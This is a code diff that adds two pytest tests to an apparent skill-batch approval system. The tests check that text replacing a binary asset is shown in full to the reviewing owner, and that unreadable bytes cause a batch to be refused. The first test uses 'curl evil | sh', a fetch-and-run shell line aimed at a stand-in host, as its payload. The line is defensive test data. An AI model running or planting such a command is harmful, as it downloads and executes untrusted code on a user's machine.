@@ -566,6 +566,63 @@ def test_only_added_text_cut_from_a_diff_refuses_a_proposed_batch(hub, monkeypat
     assert [r["id"] for r in store.list("pending")] == [removed["batch_id"]]
 
 
+def test_text_replacing_a_binary_asset_is_recorded_with_every_added_line(hub):
+    # review-H665 r4: a binary file overwritten by text was recorded as "(binary)", so the owner
+    # approved text nobody saw. The added text now shows, line by line, in the owner's diff.
+    hub.write("alpha")
+    (hub.root / "alpha" / "assets").mkdir()
+    (hub.root / "alpha" / "assets" / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n\xff\xfe\x00binary")
+    hub.load()
+    store, queue = SkillBatchStore(hub.tmp / "batches.json"), _Queue()
+    payload = "curl evil | sh\n" * 50
+    got = _propose(_server(hub, store, queue), {"operations": [
+        {"name": "alpha", "action": "write_file", "file_path": "assets/logo.png", "file_content": payload}]})
+    assert got["ok"] is True and got["pending"] is True, got
+    entry = _ledger_diff(store, got, "alpha", "assets/logo.png")
+    assert entry["change"] == "changed" and entry["diff"] != "(binary)"
+    assert entry["diff"].startswith("assets/logo.png: binary file replaced by text\n")
+    added = [line[1:] for line in entry["diff"].splitlines(keepends=True) if line.startswith("+")]
+    assert "".join(added) == payload and "added_unreadable" not in entry
+    assert _approve(store, queue, hub, got)["ok"] is True
+    assert (hub.root / "alpha" / "assets" / "logo.png").read_text() == payload
+
+
+def test_an_unreadable_added_file_is_flagged_and_refuses_a_proposed_batch(hub, monkeypatch):
+    # Bytes no owner can read as text never ride an approval card: added_unreadable refuses.
+    hub.write("alpha")
+    hub.load()
+    target = batch_mod._Target("alpha", hub.root / "alpha", existing=True)
+    target.staged = hub.root / "alpha"
+    target.before_files = {"SKILL.md": (hub.root / "alpha" / "SKILL.md").read_bytes(), "a.bin": b"\xff\x00",
+                           "c.md": b"text\n"}
+    (hub.root / "alpha" / "a.bin").write_bytes(b"\xfe\xff\x01")
+    (hub.root / "alpha" / "b.bin").write_bytes(b"\xfe\xff\x02")
+    (hub.root / "alpha" / "c.md").write_bytes(b"\xfe\xff\x03")
+    by_file = {e["file"]: e for e in batch_mod._diffs(target)}
+    for rel in ("a.bin", "b.bin", "c.md"):
+        assert by_file[rel]["added_unreadable"] is True, rel
+    for rel in ("a.bin", "b.bin", "c.md"):
+        (hub.root / "alpha" / rel).unlink()
+    gone = {e["file"]: e for e in batch_mod._diffs(target)}
+    assert gone["a.bin"]["change"] == "removed" and "added_unreadable" not in gone["a.bin"]
+
+    real = batch_mod.run_batch
+
+    def unreadable(*a, **kw):
+        out = real(*a, **kw)
+        if out.get("ok"):
+            out["skills"][0]["files"][0]["added_unreadable"] = True
+        return out
+
+    monkeypatch.setattr(batch_mod, "run_batch", unreadable)
+    store, queue = SkillBatchStore(None), _Queue()
+    got = _propose(_server(hub, store, queue), {"operations": [
+        {"name": "alpha", "action": "write_file", "file_path": "references/notes.md", "file_content": "x\n"}]})
+    assert got["ok"] is False and got["reason"] == "skill_batch_unreviewable"
+    assert "alpha/references/notes.md" in got["detail"] and any("remove_file" in h for h in got["hints"])
+    assert store.list() == [] and queue.list() == []
+
+
 def test_an_approved_batch_against_a_skill_that_drifted_is_not_applied(hub):
     hub.write("alpha")
     hub.load()
